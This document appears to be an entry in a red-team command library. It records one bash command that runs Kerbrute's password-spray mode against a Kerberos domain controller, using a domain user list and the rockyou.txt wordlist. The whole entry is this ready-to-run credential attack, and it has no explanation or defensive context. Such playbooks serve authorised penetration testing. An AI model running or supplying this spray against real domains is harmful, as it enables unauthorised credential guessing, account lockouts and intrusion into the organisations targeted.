---
id: 78f0fe45-369f-4faf-9f36-cf47102b93e1
name: Kerbrute Password Spray with domain_users.txt and rockyou.txt
type: command
executor: bash
data: ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt
  rockyou.txt
output: null
created_at: '2023-04-06T03:56:04.255563+00:00'
updated_at: '2023-04-10T20:36:09.930886+00:00'
---

# Kerbrute Password Spray with domain_users.txt and rockyou.txt

```bash
./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt
```
